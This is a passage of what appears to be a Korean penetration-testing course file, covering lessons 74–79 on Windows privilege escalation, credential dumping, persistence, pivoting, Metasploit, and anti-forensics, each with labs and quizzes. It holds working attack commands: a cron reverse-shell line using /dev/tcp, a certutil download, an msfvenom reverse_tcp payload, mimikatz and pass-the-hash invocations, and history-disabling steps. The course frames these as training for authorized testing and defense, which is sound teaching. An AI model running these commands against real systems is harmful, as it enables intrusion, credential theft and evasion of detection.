  e:"<code>C:\\Program Files\\App\\svc.exe</code>가 따옴표 없이 등록되면 윈도우가 <code>C:\\Program.exe</code>, <code>C:\\Program Files\\App.exe</code> 순으로 찾습니다. 그 경로에 쓸 수 있으면 악성 exe가 <b>SYSTEM으로</b> 실행됩니다."},
   {t:"<code>SeImpersonatePrivilege</code>를 가진 서비스 계정에서 SYSTEM을 얻는 대표적 방법은?",o:["재부팅","PrintSpoofer·JuicyPotato 등 Potato 계열 익스플로잇으로 SYSTEM 토큰을 훔침","비밀번호 크랙","포트 스캔"],a:1,
    e:"<b>Potato 계열</b>(PrintSpoofer·RoguePotato·GodPotato)은 <code>SeImpersonate</code>를 악용해 SYSTEM 토큰을 흉내내 SYSTEM 셸을 엽니다. 웹·DB 서비스 계정이 이 권한을 기본 보유해 실전의 정석입니다."},
   {t:"'웹 침투 → 서비스 계정 셸 → Potato → SYSTEM'이 흔한 경로인 이유는?",o:["우연","웹·DB 서비스 계정이 SeImpersonate를 기본 보유하는 경우가 많아, 그 셸에서 Potato로 바로 SYSTEM이 되기 때문","느려서","윈도우 버그"],a:1,
    e:"IIS·MSSQL 등 서비스 계정은 <code>SeImpersonate</code>를 <b>기본 보유</b>합니다. 웹 취약점으로 그 계정 셸을 얻으면 Potato 한 방에 SYSTEM이라, 윈도우 침투의 정석 경로입니다."}]},

{d:74,t:"윈도우 자격증명 수집",g:"윈도우 시스템에서 해시·평문·티켓을 추출해 내부 이동으로 잇는다.",
c:"<p>SYSTEM을 얻었으면, 이제 <b>자격증명을 수집</b>해 다른 시스템·도메인으로 확장합니다. 방어 코스에서 배운 mimikatz·LSASS 덤프의 <b>공격 쪽</b>입니다.</p><p><b>mimikatz — 자격증명의 왕</b><br>메모리(LSASS)에서 <b>평문 비밀번호·NTLM 해시·Kerberos 티켓</b>을 추출합니다. SYSTEM 권한 필요.<br><code>sekurlsa::logonpasswords</code> — 로그온한 사용자들의 비밀번호·해시.<br><code>sekurlsa::tickets</code> — Kerberos 티켓.<br><code>lsadump::sam</code> — 로컬 SAM의 해시.</p><p><b>LSASS 덤프 후 오프라인 분석</b><br>mimikatz가 EDR에 잡히면, LSASS 메모리를 <b>덤프만</b> 떠서(<code>procdump</code>·Task Manager·<code>comsvcs.dll</code>) Kali에서 분석: <code>pypykatz lsa minidump lsass.dmp</code>.</p><p><b>SAM·SYSTEM 하이브</b><br>로컬 계정 해시는 SAM에 있습니다. <code>reg save HKLM\\SAM sam.save; reg save HKLM\\SYSTEM system.save</code> → <code>secretsdump.py -sam sam.save -system system.save LOCAL</code>로 해시 추출.</p><p><b>저장된 자격증명</b><br>· <code>cmdkey /list</code> — 저장된 자격증명.<br>· <b>레지스트리</b>: autologon 비밀번호, VNC·PuTTY.<br>· <b>파일</b>: <code>Unattend.xml</code>·<code>sysprep.xml</code>(배포 시 비밀번호), 웹·앱 config.<br>· <b>브라우저·앱</b>: LaZagne로 자동 수집.</p><p><b>Pass-the-Hash</b><br>NTLM 해시를 얻으면 <b>크랙하지 않고</b> 그 해시로 인증합니다(방어 코스의 그 공격). <code>evil-winrm -i 호스트 -u user -H NTLM해시</code>, <code>crackmapexec smb 호스트 -u user -H 해시</code>. 해시 = 비밀번호와 같은 힘.</p><p><b>왜 결정적인가:</b> 윈도우는 대개 <b>도메인(Active Directory)</b>으로 묶여 있습니다. 한 머신에서 얻은 자격증명·해시가 <b>다른 머신·도메인 전체</b>의 열쇠가 됩니다(다음 ACT의 AD). 특히 <b>도메인 관리자</b> 자격증명이 한 번이라도 그 머신에 로그온했다면, LSASS에서 뽑아 도메인을 장악합니다.</p><p><b>실전:</b> SYSTEM을 잡으면 mimikatz(또는 LSASS 덤프)로 자격증명을 뽑고, SAM 해시를 추출하고, 얻은 해시로 pass-the-hash를 시도해 다른 호스트로 이동합니다.</p>",
term:"# mimikatz (SYSTEM 권한)\nmimikatz # privilege::debug\nmimikatz # sekurlsa::logonpasswords\n  User     : Administrator\n  NTLM     : 64f12cddaa88057e06a81b54e73b949b\n  Password : (평문이 나오기도)\n# Pass-the-Hash로 다른 호스트:\n$ evil-winrm -i 10.10.10.60 -u Administrator -H 64f12cdd...",
lab:["SYSTEM 권한에서 mimikatz <code>sekurlsa::logonpasswords</code>를 실행한다","EDR 회피를 위해 LSASS를 덤프만 떠 pypykatz로 분석한다","<code>reg save</code>로 SAM·SYSTEM 하이브를 추출한다","secretsdump로 로컬 해시를 뽑는다","<code>cmdkey /list</code>·Unattend.xml 등 저장된 자격증명을 찾는다","얻은 NTLM 해시로 pass-the-hash를 시도한다","도메인 관리자 로그온 흔적을 LSASS에서 확인한다"],
q:[{t:"mimikatz의 <code>sekurlsa::logonpasswords</code>가 하는 일은?",o:["파일 삭제","LSASS 메모리에서 로그온한 사용자들의 평문 비밀번호·NTLM 해시·Kerberos 티켓을 추출","포트 스캔","서비스 중지"],a:1,
  e:"LSASS는 <b>로그온 자격증명을 메모리에 보관</b>합니다. SYSTEM 권한으로 mimikatz를 돌리면 평문·해시·티켓이 나옵니다. 방어 코스에서 이걸 탐지·차단하던 그 공격입니다."},
   {t:"Pass-the-Hash 공격의 원리는?",o:["해시를 크랙","NTLM 해시를 크랙하지 않고 그 해시 자체로 인증해, 비밀번호를 몰라도 로그인·이동하는 것","포트 스캔","비밀번호 추측"],a:1,
    e:"NTLM 인증은 <b>해시 기반</b>이라, 해시만 있으면 평문 없이 인증됩니다. <code>evil-winrm -H 해시</code>로 다른 호스트에 로그인 — 해시가 곧 비밀번호입니다."},
   {t:"한 윈도우 머신의 자격증명 수집이 도메인 전체 장악으로 이어질 수 있는 이유는?",o:["우연","도메인 관리자가 그 머신에 로그온한 적이 있으면 LSASS에 그 자격증명이 남아, 추출해 도메인 전체를 제어할 수 있어서","느려서","윈도우 버그"],a:1,
    e:"윈도우는 <b>Active Directory</b>로 묶입니다. 도메인 관리자 자격증명이 한 번이라도 그 머신에 남으면, LSASS에서 뽑아 <b>도메인 전체</b>의 열쇠가 됩니다. 다음 ACT의 AD 공격으로 이어집니다."}]},

{d:75,t:"지속성 — 발판을 잃지 않기",g:"재부팅·탐지 후에도 접근을 유지하는 여러 방법과 그 탐지 흔적을 이해한다.",
c:"<p>어렵게 얻은 접근을 <b>유지</b>합니다. 셸이 끊기거나 재부팅돼도 다시 들어갈 <b>지속성(Persistence)</b>을 심습니다. 방어 코스에서 탐지하던 그 기법들을, 이제 <b>심는 쪽</b>입니다.</p><p><b>리눅스 지속성</b><br>· <b>SSH 키</b>: 내 공개키를 <code>~/.ssh/authorized_keys</code>에 추가 → 비밀번호 없이 언제든.<br>· <b>cron</b>: <code>*/10 * * * * 리버스셸</code> — 10분마다 콜백.<br>· <b>systemd 서비스·타이머</b>: 재부팅 후에도 자동 실행(방어 코스의 '자동 시작 = 지속성').<br>· <b>백도어 계정</b>: UID 0 계정 추가(눈에 띔).<br>· <b>.bashrc·프로파일</b>: 로그인 시 실행.<br>· <b>SUID 백도어</b>: <code>chmod +s /bin/bash</code>(재부팅엔 안 남지만 즉시 root).</p><p><b>윈도우 지속성</b><br>· <b>레지스트리 Run 키</b>: 로그인 시 실행.<br>· <b>스케줄 작업</b>: 주기적·부팅 시.<br>· <b>서비스</b>: 악성 서비스 등록.<br>· <b>스타트업 폴더</b>.<br>· <b>WMI 이벤트 구독</b>(은밀).<br>· <b>골든 티켓</b>(AD, 다음 ACT).</p><p><b>C2 프레임워크</b><br>실전 레드팀은 개별 리버스 셸 대신 <b>C2</b>(Command & Control)를 씁니다 — <b>Cobalt Strike·Sliver·Mythic·Metasploit</b>. 여러 에이전트를 관리하고, 비컨 주기·암호화·도메인 프론팅으로 <b>은밀한 지속 통신</b>을 합니다. 방어 코스에서 탐지하던 그 비컨을 만드는 겁니다.</p><p><b>OPSEC — 지속성은 위험하다</b><br>지속성은 <b>흔적을 남깁니다.</b> 방어 코스에서 배웠듯, <b>새 계정·cron·서비스·Run 키·비정상 아웃바운드</b>가 다 탐지 지표입니다. 실전 레드팀은:<br>· 여러 개를 심어 하나가 발각돼도 유지.<br>· 정상 트래픽에 섞이게(비컨 주기·정상 도메인).<br>· 눈에 띄는 것(UID 0 계정)보다 은밀한 것(WMI·타이머).<br><b>탐지될 것을 알고, 탐지를 늦추는</b> 것이 목표입니다.</p><p><b>중요 — 실습 정리</b><br>모의해킹에선 심은 지속성·백도어·계정을 <b>반드시 보고서에 기록하고 제거</b >합니다. 표적에 남기면 <b>진짜 공격자의 통로</b>가 됩니다. 허가된 실습 후에도 정리하세요.</p><p><b>실전:</b> 접근을 얻으면 최소 두어 개의 지속성(SSH 키 + cron/서비스)을 심되, 방어자 관점에서 '이게 어떻게 탐지될까'를 생각하며 은밀한 쪽을 고릅니다. 그리고 끝나면 정리·기록합니다.</p>",
term:"# 리눅스 지속성 — SSH 키 (조용한 편)\n$ echo '내공개키' >> ~/.ssh/authorized_keys\n# cron 콜백 (더 시끄러움 — 방어자가 잡던 그것)\n$ (crontab -l; echo '*/10 * * * * bash -c \"bash -i >& /dev/tcp/10.10.14.5/4444 0>&1\"') | crontab -\n# 실전 레드팀은 C2(Sliver/Cobalt Strike)로 관리",
lab:["<code>authorized_keys</code>에 SSH 키를 추가해 지속성을 심는다","cron 콜백을 등록해본다(실습 표적)","systemd 서비스·타이머 지속성을 이해한다","윈도우 Run 키·스케줄 작업 지속성을 정리한다","각 지속성이 방어 코스에서 어떻게 탐지되는지 대응시킨다","C2 프레임워크(Sliver 등)의 개념을 파악한다","실습 후 심은 지속성을 기록하고 제거한다"],
q:[{t:"실전 레드팀이 개별 리버스 셸 대신 C2 프레임워크(Cobalt Strike·Sliver)를 쓰는 이유는?",o:["더 싸서","여러 에이전트를 관리하고, 비컨 주기·암호화·정상 트래픽 위장으로 은밀한 지속 통신을 하기 위해","불법이라서","더 느려서"],a:1,
  e:"C2는 <b>여러 침투 지점을 관리</b>하고, 비컨을 정상 트래픽에 섞어 은밀하게 통신합니다. 방어 코스에서 탐지하던 그 비컨을 만드는 도구입니다."},
   {t:"모의해킹에서 심은 지속성·백도어를 반드시 제거·기록해야 하는 이유는?",o:["귀찮아서","남겨두면 진짜 공격자가 악용하는 통로가 되고, 계약상 표적을 원상 복구해야 하기 때문","느려서","불법이라서"],a:1,
    e:"심어둔 백도어·계정은 <b>진짜 공격자의 문</b>이 됩니다. 모의해킹은 표적을 해치지 않아야 하므로, 심은 것을 보고서에 기록하고 <b>반드시 제거</b>합니다."},
   {t:"방어를 아는 공격자가 지속성을 심을 때의 이점은?",o:["없음","각 기법이 어떻게 탐지되는지 알아, 눈에 띄는 것(UID 0 계정)보다 은밀한 것을 고르고 탐지를 늦출 수 있음","더 빠름","합법이 됨"],a:1,
    e:"방어 코스에서 <b>새 계정·cron·Run 키·비정상 아웃바운드</b>가 탐지 지표임을 배웠습니다. 그걸 아는 공격자는 은밀한 지속성(WMI·타이머)을 고르고 정상 트래픽에 섞습니다. 방어 지식이 공격의 은밀함이 됩니다."}]},

{d:76,t:"파일 전송과 피벗팅",g:"도구를 표적에 나르고, 침투한 호스트를 발판 삼아 내부로 들어간다.",
c:"<p>권한 상승과 나란히 필요한 <b>실무 기술</b> 둘: 파일 전송과 피벗팅.</p><p><b>파일 전송 — 도구를 표적에 나르기</b><br>linpeas·익스플로잇·정적 바이너리를 표적에 올려야 합니다.<br><b>HTTP</b>(가장 흔함): Kali <code>python3 -m http.server 80</code> → 표적 <code>wget/curl 내IP/파일</code>(리눅스), <code>certutil -urlcache -f http://내IP/파일 out</code>·<code>iwr</code>(윈도우).<br><b>SCP</b>: SSH 접근이 있으면.<br><b>SMB</b>: <code>impacket-smbserver share . </code> → 윈도우 <code>copy \\\\내IP\\share\\파일</code>.<br><b>nc**·base64**: 최소 환경. <code>base64 파일</code> → 붙여넣기 → <code>base64 -d</code>.</p><p><b>피벗팅(Pivoting) — 침투 호스트를 발판으로</b><br>첫 침투 호스트는 대개 <b>내부망으로 가는 관문</b>입니다. 밖에서 못 닿는 내부 호스트(<code>192.168.x</code>)에, <b>침투 호스트를 경유해</b> 접근합니다.<br><b>SSH 터널링</b>:<br>· <b>로컬 포워딩</b> <code>ssh -L 8080:내부IP:80 user@침투호스트</code>: 내 8080 → 내부 웹.<br>· <b>동적(SOCKS)</b> <code>ssh -D 1080 user@침투호스트</code> + <b>proxychains</b>: 모든 도구를 내부망으로. <code>proxychains nmap 192.168.1.0/24</code>.<br><b>chisel</b>: SSH 없을 때. 침투 호스트에 에이전트를 올려 터널. 방화벽·NAT를 넘습니다.<br><b>ligolo-ng</b>: 요즘 인기 있는 피벗 도구.</p><p><b>이중 피벗</b><br>내부 호스트 A를 통해 더 깊은 B로 — 터널을 중첩합니다. 실전 내부망은 여러 층이라 자주 필요합니다.</p><p><b>왜 핵심인가:</b> 실전 침투는 한 대에서 끝나지 않습니다. 웹서버(DMZ)를 뚫고 → 그걸 발판으로 내부 DB·AD로 들어갑니다. <b>피벗팅이 없으면 첫 호스트에 갇힙니다.</b> 방어 코스의 '내부 이동(lateral movement)'이 바로 이 관문을 넘는 것입니다.</p><p><b>실전:</b> 침투 호스트에서 <code>ip a</code>·<code>ss -tulpn</code>·ARP로 내부망을 파악하고, SSH 동적 터널 + proxychains나 chisel로 내부를 스캔·공격합니다. 각 홉마다 자격증명을 재사용합니다.</p>",
term:"# 동적 SSH 터널 + proxychains로 내부망 공격\nkali@kali:~$ ssh -D 1080 deploy@10.10.10.50   # 침투 호스트 경유\nkali@kali:~$ proxychains nmap -sT 192.168.1.0/24   # 내부망 스캔\nkali@kali:~$ proxychains firefox http://192.168.1.10  # 내부 웹\n# chisel (SSH 없을 때): 침투호스트에 에이전트 -> 역터널",
lab:["Kali에서 <code>python3 -m http.server</code>로 도구를 서빙한다","리눅스 표적에 <code>wget</code>으로, 윈도우에 <code>certutil</code>로 전송한다","<code>impacket-smbserver</code>로 SMB 전송을 시험한다","침투 호스트에서 내부망(<code>ip a</code>·ARP)을 파악한다","<code>ssh -D</code> + proxychains로 내부망을 스캔한다","chisel로 SSH 없는 피벗을 구성한다","이중 피벗(A→B)을 이해한다"],
q:[{t:"피벗팅(pivoting)이 필요한 이유는?",o:["속도","첫 침투 호스트를 발판 삼아, 밖에서 직접 못 닿는 내부망 호스트에 그 호스트를 경유해 접근하기 위해","암호화","백업"],a:1,
  e:"내부 호스트(<code>192.168.x</code>)는 인터넷에서 직접 못 닿습니다. 침투한 관문 호스트를 <b>경유</b>해야 내부로 들어갑니다. 피벗이 없으면 첫 호스트에 갇힙니다 — 내부 이동의 핵심입니다."},
   {t:"<code>ssh -D 1080</code> + proxychains 조합이 하는 일은?",o:["파일 전송","침투 호스트를 통한 SOCKS 프록시를 만들어, 모든 도구(nmap·브라우저)를 내부망으로 터널링","비밀번호 크랙","서비스 중지"],a:1,
    e:"<code>-D</code>는 <b>동적 SOCKS 프록시</b>를 엽니다. proxychains로 감싸면 <code>nmap</code>·<code>firefox</code> 등이 침투 호스트를 경유해 <b>내부망</b>에 닿습니다. 한 번의 터널로 모든 도구를 피벗합니다."},
   {t:"윈도우 표적에 파일을 전송하는 흔한 방법이 아닌 것은?",o:["certutil -urlcache","PowerShell iwr","SMB 공유(impacket-smbserver)","apt install"],a:3,
    e:"<code>apt</code>는 데비안 계열 리눅스 패키지 관리자로 윈도우와 무관합니다. 윈도우는 <b>certutil·PowerShell(iwr)·SMB</b>로 파일을 나릅니다."}]},

{d:77,t:"셸과 상승 자동화 — Metasploit",g:"Metasploit으로 익스플로잇·셸·권한 상승을 통합 운용한다.",
c:"<p>지금까지 수동으로 한 것들을 <b>Metasploit</b>이 통합해줍니다. 익스플로잇·페이로드·세션·후속작업을 한 프레임워크에서.</p><p><b>기본 흐름(방어→공격 도구편 복습·심화)</b><br><code>msfconsole</code> → <code>search</code> → <code>use</code> → <code>set</code> → <code>exploit</code>. 성공하면 <b>세션</b>이 열립니다.</p><p><b>Meterpreter — 강력한 페이로드</b><br>단순 셸이 아니라 <b>기능이 풍부한 에이전트</b>입니다.<br>· <code>sysinfo</code>·<code>getuid</code> — 정보.<br>· <code>getsystem</code> — 자동 권한 상승 시도(윈도우).<br>· <code>hashdump</code> — 해시 추출.<br>· <code>upload/download</code> — 파일 전송.<br>· <code>portfwd</code>·<code>route</code> — 피벗팅.<br>· <code>migrate</code> — 다른 프로세스로 이주(안정성·은신).<br>· <code>load kiwi</code> — mimikatz 내장.</p><p><b>로컬 익스플로잇 자동 추천</b><br>세션에서 <code>run post/multi/recon/local_exploit_suggester</code> — 이 시스템에 맞는 <b>권한 상승 익스플로잇</b>을 자동 추천·실행. 리눅스·윈도우 모두.</p><p><b>후속작업(post) 모듈</b><br><code>run post/...</code>로 자격증명 수집·지속성·피벗을 자동화. 세션을 백그라운드로(<code>background</code>) 두고 여러 개 관리.</p><p><b>msfvenom — 페이로드 생성</b><br><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=내IP LPORT=443 -f exe -o s.exe</code>. 인코더·포맷·인젝션 옵션으로 AV 회피도.</p><p><b>양날의 검 — OPSEC</b><br>Metasploit은 강력하지만 <b>시그니처가 잘 알려져</b> AV·EDR에 쉽게 잡힙니다. Meterpreter·기본 페이로드는 탐지가 많습니다(방어 코스에서 배운 그 탐지). 그래서:<br>· CTF·실습엔 최고 — 빠르고 편함.<br>· 탐지 회피가 중요한 실전에선 <b>수동 기법·커스텀 페이로드·다른 C2</b>를 섞습니다.<br>도구를 아는 것과 도구에 의존하는 것은 다릅니다 — <b>수동으로 할 줄 알아야</b> Metasploit이 막힐 때 뚫습니다.</p><p><b>실전:</b> 초기 접근·권한 상승은 Metasploit으로 빠르게 하되, 원리를 알고 씁니다. <code>local_exploit_suggester</code>로 상승 후보를 뽑고, Meterpreter로 자격증명·피벗을 운용합니다. 탐지가 걱정되면 수동으로 전환합니다.</p>",
term:"# Metasploit 세션에서 자동 권한 상승 추천\nmeterpreter > getuid\nServer username: target\\www-data\nmeterpreter > background\nmsf6 > use post/multi/recon/local_exploit_suggester\nmsf6 > set SESSION 1 ; run\n[+] target is vulnerable to CVE-2021-4034 (PwnKit)\nmsf6 > use exploit/linux/local/... ; run\nmeterpreter > getuid  ->  root",
lab:["<code>msfconsole</code>에서 익스플로잇으로 세션을 연다","Meterpreter <code>sysinfo</code>·<code>getuid</code>로 정보를 본다","<code>local_exploit_suggester</code>로 상승 후보를 뽑는다","추천 익스플로잇으로 권한을 올린다","<code>hashdump</code>·<code>load kiwi</code>로 자격증명을 수집한다","<code>portfwd</code>·<code>route</code>로 피벗을 구성한다","msfvenom으로 페이로드를 생성한다"],
q:[{t:"Meterpreter가 단순 리버스 셸보다 강력한 이유는?",o:["더 빠름","sysinfo·hashdump·upload·portfwd·migrate 등 후속작업 기능이 내장된 풍부한 에이전트이기 때문","암호화만","무료라서"],a:1,
  e:"Meterpreter는 <b>기능이 풍부한 에이전트</b>입니다. 정보 수집·해시 덤프·파일 전송·피벗·프로세스 이주를 명령 하나로 하니, 단순 셸보다 훨씬 강력합니다."},
   {t:"Metasploit의 OPSEC상 한계는?",o:["없음","시그니처가 잘 알려져 AV·EDR에 쉽게 탐지되므로, 탐지 회피가 중요한 실전에선 수동 기법·다른 C2를 섞어야 함","너무 어려움","불법"],a:1,
    e:"Meterpreter·기본 페이로드는 <b>시그니처가 유명</b>해 잘 잡힙니다(방어 코스의 그 탐지). CTF엔 최고지만, 탐지팀이 있는 실전에선 수동 기법·커스텀 페이로드로 보완합니다."},
   {t:"'수동으로 할 줄 알아야 한다'가 Metasploit 사용에서 뜻하는 것은?",o:["도구를 쓰지 말라","도구 원리를 이해하고 수동 기법도 갖춰야, Metasploit이 막히거나 탐지될 때 대체·우회할 수 있음","항상 수동","도구가 무의미"],a:1,
    e:"도구는 <b>보조</b>입니다. 원리를 알고 수동으로도 할 수 있어야, 자동화가 막히는 상황(WAF·EDR·비표준)에서 뚫습니다. 도구 사용과 도구 의존은 다릅니다."}]},

{d:78,t:"윈도우 커널·기타 상승 벡터",g:"윈도우의 미패치 취약점과 남은 상승 경로들을 정리한다.",
c:"<p>서비스·권한 외의 윈도우 상승 경로들을 마저 정리합니다.</p><p><b>미패치 커널 익스플로잇</b><br><code>systeminfo</code>의 <b>핫픽스 목록</b>이 적으면 미패치 취약점 후보입니다.<br><b>Windows Exploit Suggester</b>(WES-NG): systeminfo 출력을 넣으면 빠진 패치에 맞는 익스플로잇을 추천.<br>유명한 것: <b>PrintNightmare(CVE-2021-34527)</b> — 프린트 스풀러, <b>HiveNightmare/SeriousSAM</b> — SAM 파일 읽기, <b>MS16-032·MS17-010</b> 등. 커널 익스플로잇은 리눅스처럼 <b>불안정</b>하니 오설정을 먼저.</p><p><b>UAC 우회</b><br>관리자 그룹이지만 <b>중간 무결성</b>(UAC로 제한)일 때, UAC를 우회해 <b>높은 무결성</b>으로 승격합니다. <code>fodhelper</code>·<code>eventvwr</code> 레지스트리 하이재킹 등. 관리자→완전한 관리자 권한.</p><p><b>레지스트리·파일 오설정</b><br>· <b>약한 레지스트리 권한</b>: 서비스 설정을 담은 레지스트리 키를 쓸 수 있으면 서비스 하이재킹.<br>· <b>DLL 하이재킹</b>: SYSTEM 프로세스가 <b>쓰기 가능한 경로</b>에서 DLL을 로드하면, 악성 DLL로 교체(리눅스 LD_PRELOAD의 윈도우판).<br>· <b>저장된 자격증명</b>: <code>Unattend.xml</code>·GPP(cpassword)·레지스트리 autologon.</p><p><b>스케줄 작업·스타트업</b><br>SYSTEM으로 도는 작업이 쓰기 가능한 것을 실행하면 악용(리눅스 cron의 윈도우판).</p><p><b>AV/EDR 회피 개요</b><br>실전에선 페이로드가 <b>탐지</b>됩니다. 회피 기법:<br>· <b>AMSI 우회</b>: PowerShell 스크립트 검사를 무력화.<br>· <b>난독화·인코딩</b>: 시그니처 회피.<br>· <b>LOLBins</b>: 정상 윈도우 바이너리(<code>certutil·regsvr32·mshta</code>)로 악성 행위 — 방어 코스의 그 LOLBins.<br>· <b>인메모리 실행</b>: 디스크에 안 남김.<br>깊은 주제이니 개념만 잡고, 필요할 때 전문화합니다.</p><p><b>정리 — 윈도우 상승 체크리스트</b><br>① <code>whoami /priv</code>(SeImpersonate→Potato) ② 서비스 오설정(PowerUp) ③ AlwaysInstallElevated ④ 저장된 자격증명 ⑤ 미패치(WES-NG) ⑥ UAC 우회(관리자면). winPEAS가 이 대부분을 자동 점검합니다.</p><p><b>실전:</b> winPEAS/PowerUp로 훑고, SeImpersonate→Potato를 최우선, 그다음 서비스·저장 자격증명, 마지막으로 커널을 봅니다. LOLBins로 탐지를 줄입니다.</p>",
term:"# WES-NG로 미패치 익스플로잇 추천\nkali@kali:~$ python wes.py systeminfo.txt\n[+] MS16-032  (Secondary Logon)  probability: high\n[+] CVE-2021-1732 ...\n# LOLBins로 조용히 다운로드 (방어 코스의 그 기법)\nC:\\> certutil -urlcache -f http://10.10.14.5/x.exe x.exe",
lab:["<code>systeminfo</code>를 저장해 WES-NG로 분석한다","미패치 커널 익스플로잇 후보를 확인한다","관리자면 UAC 우회(fodhelper 등)를 이해한다","DLL 하이재킹 가능 경로를 점검한다","Unattend.xml·GPP cpassword 등 저장 자격증명을 찾는다","LOLBins로 조용한 다운로드·실행을 시험한다","윈도우 상승 체크리스트를 완성한다"],
q:[{t:"윈도우 DLL 하이재킹의 원리는(리눅스의 무엇에 대응하나)?",o:["SUID","SYSTEM 프로세스가 쓰기 가능한 경로에서 DLL을 로드할 때 악성 DLL로 교체 — 리눅스 LD_PRELOAD/라이브러리 하이재킹의 윈도우판","cron","포트 스캔"],a:1,
  e:"프로그램이 <b>쓰기 가능한 경로의 DLL</b>을 로드하면 악성 DLL로 바꿔치기합니다. 리눅스의 라이브러리 하이재킹(LD_PRELOAD·rpath)에 대응하는 윈도우 기법입니다."},
   {t:"LOLBins(certutil·regsvr32·mshta 등)를 쓰는 이유는?",o:["빠름","정상 윈도우 바이너리라 AV·EDR가 신뢰해, 악성 다운로드·실행을 해도 탐지를 피하기 쉬움","무료","암호화"],a:1,
    e:"LOLBins는 <b>OS 기본 바이너리</b>라 화이트리스트·신뢰를 받습니다. 방어 코스에서 이 '정상 도구의 악용'을 탐지했었죠 — 공격자는 이걸로 탐지를 줄입니다."},
   {t:"윈도우 권한 상승에서 커널 익스플로잇을 뒤로 미루는 이유는(리눅스와 동일)?",o:["느려서","불안정해 시스템을 다운시킬 위험이 있어, SeImpersonate·서비스 오설정 등 안정적 경로를 먼저 시도","불법","윈도우엔 없어서"],a:1,
    e:"윈도우 커널 익스플로잇도 <b>불안정</b >합니다. Potato·서비스 오설정·저장 자격증명 같은 <b>안정적 오설정</b>을 먼저 시도하고, 커널은 마지막입니다. 리눅스와 같은 원칙입니다."}]},

{d:79,t:"흔적 관리와 안티포렌식 — 방어자의 눈으로",g:"공격이 남기는 흔적을 이해하고, 방어를 아는 공격자의 관점을 익힌다.",
c:"<p>침투는 <b>흔적을 남깁니다.</b> 당신이 방어 코스에서 추적하던 그 흔적을, 이제 <b>남기는 쪽·줄이는 쪽</b>에서 봅니다. 이 관점이 공격·방어 모두를 완성합니다.</p><p><b>공격이 남기는 흔적(방어 코스 복습, 이제 공격자 시점)</b><br>· <b>인증 로그</b>: 로그인 성공·실패, sudo 사용(<code>/var/log/auth.log</code>).<br>· <b>명령 이력</b>: <code>.bash_history</code>.<br>· <b>웹 로그</b>: 익스플로잇 요청, User-Agent(도구 이름!).<br>· <b>네트워크</b>: 리버스 셸·C2 아웃바운드 연결, 포트 스캔.<br>· <b>파일</b>: 업로드한 도구, 생성한 계정·cron·서비스.<br>· <b>프로세스</b>: 비정상 부모-자식(웹서버→bash), 이상한 실행 위치(<code>/tmp</code>).<br>· <b>윈도우 이벤트 로그</b>: 로그온(4624/4625), 프로세스 생성(4688), 서비스 설치(7045).</p><p><b>안티포렌식 — 흔적 줄이기</b><br>· <b>이력 비활성화</b>: <code>unset HISTFILE</code>, <code>export HISTSIZE=0</code>.<br>· <b>로그 정리</b>: 특정 항목 삭제(전체 삭제는 오히려 티남).<br>· <b>타임스톰핑</b>: 파일 시각 조작(<code>touch -r</code>).<br>· <b>메모리 전용</b>: 디스크에 안 남기고 인메모리 실행.<br>· <b>정상 위장</b>: 도구 이름·위치를 정상처럼, User-Agent 위조.<br>· <b>C2 은닉</b>: 정상 도메인·주기로 비컨을 정상 트래픽에 섞음.</p><p><b>중요한 균형 — 윤리와 현실</b><br>· <b>모의해킹</b>: 흔적을 <b>지우지 않습니다.</b> 오히려 다 기록해 방어팀이 탐지 능력을 검증하게 합니다. 안티포렌식은 <b>레드팀 훈련</b>(탐지 대응 평가)에서만, 그리고 <b>실습·CTF 학습용</b>으로만.<br>· 로그를 <b>파괴</b>하는 것은 대개 계약 위반이고 불법입니다.</p><p><b>당신의 진짜 강점</b><br>방어와 공격을 <b>둘 다</b> 아는 사람은:<br>· 공격 시: '이게 어떻게 탐지될까'를 알아 조용히 움직입니다.<br>· 방어 시: '공격자가 어떻게 숨길까'를 알아 더 깊이 탐지합니다.<br>안티포렌식을 배우는 진짜 이유는 <b>탐지를 더 잘하기 위해서</b>입니다 — 공격자가 무엇을 지우고 위장하는지 알아야, 그 빈틈과 위장을 간파합니다. <b>가장 강한 방어자는 공격을 아는 사람이고, 가장 위험한 공격자는 방어를 아는 사람입니다.</b></p><p><b>실전:</b> 침투하며 '내가 지금 어떤 로그를 남기나'를 의식하고, 그것이 방어 코스의 어떤 탐지 규칙에 걸리는지 대응시킵니다. 이 훈련이 양쪽 실력을 함께 키웁니다.</p>",
term:"# 내가 남기는 흔적 = 방어 코스에서 잡던 지표\n리버스 셸  -> 비정상 아웃바운드 (C2 탐지)\n웹셸 업로드 -> /var/www 새 .php, 웹서버->bash 프로세스\nsudo 악용  -> auth.log의 sudo 기록\n새 cron    -> 지속성 탐지\n# '어떻게 탐지되나'를 알면 조용히, 그리고 더 잘 탐지한다",
lab:["침투 중 남기는 흔적을 방어 코스의 탐지 지표와 대응시킨다","리버스 셸이 네트워크 로그에 어떻게 보이는지 적는다","웹셸이 프로세스 트리에서 어떻게 드러나는지 적는다","<code>unset HISTFILE</code> 등 이력 비활성화를 이해한다","모의해킹에서 흔적을 지우면 안 되는 이유를 정리한다","안티포렌식이 왜 '탐지를 더 잘하기 위한' 것인지 적는다","공격·방어 양쪽 관점의 시너지를 정리한다"],
q:[{t:"모의해킹(침투 테스트)에서 로그·흔적을 지우지 않는 이유는?",o:["귀찮아서","방어팀의 탐지 능력을 검증하기 위해 흔적을 남겨 기록하며, 로그 파괴는 대개 계약 위반·불법이기 때문","불가능해서","의미 없어서"],a:1,
  e:"모의해킹의 목적 중 하나는 <b>방어 능력 평가</b>입니다. 흔적을 남기고 기록해야 '방어팀이 이걸 탐지했나'를 봅니다. 안티포렌식은 레드팀 훈련·학습용이고, 로그 파괴는 계약 위반·불법입니다."},
   {t:"공격자가 안티포렌식(흔적 숨기기)을 배우는 것이 방어에 도움이 되는 이유는?",o:["안 됨","공격자가 무엇을 지우고 위장하는지 알아야, 그 빈틈과 위장을 간파해 더 깊이 탐지할 수 있어서","느려서","합법이라서"],a:1,
    e:"안티포렌식을 알면 <b>탐지를 더 잘합니다.</b> 공격자가 타임스톰핑·로그 정리·정상 위장을 어떻게 하는지 알아야, 그 흔적의 빈틈을 찾습니다. 배우는 진짜 이유는 방어입니다."},
   {t:"'가장 위험한 공격자는 방어를 아는 사람'인 이유는?",o:["빨라서","자기 공격이 어떻게 탐지되는지 알아 탐지를 피하고 우회하며 조용히 움직이기 때문","도구가 많아서","합법이라서"],a:1,
